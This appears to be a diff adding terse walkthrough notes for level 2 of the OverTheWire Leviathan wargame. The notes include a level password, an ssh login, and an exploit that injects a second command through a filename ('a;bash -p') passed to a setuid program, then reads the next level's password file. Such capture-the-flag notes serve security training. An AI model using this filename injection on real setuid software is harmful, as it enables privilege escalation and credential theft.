@@ -1,0 +1,12 @@
+ougahZi8Ta
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+[ltrace printfile printfile]
+[we see that printfile calls access, which check is the user that started printfile can access the file]
+[if true, cat is called with the file name]
+[this exploit is based on the fact that the bash -p command is executed as the user that "owns" the file (s flag)]
+mktemp -d
+cd [temp dir]
+touch "a;bash -p"
+~/printfile "a;bash -p"
+[you are now leviathan3]
+cat /etc/leviathan_pass/leviathan3
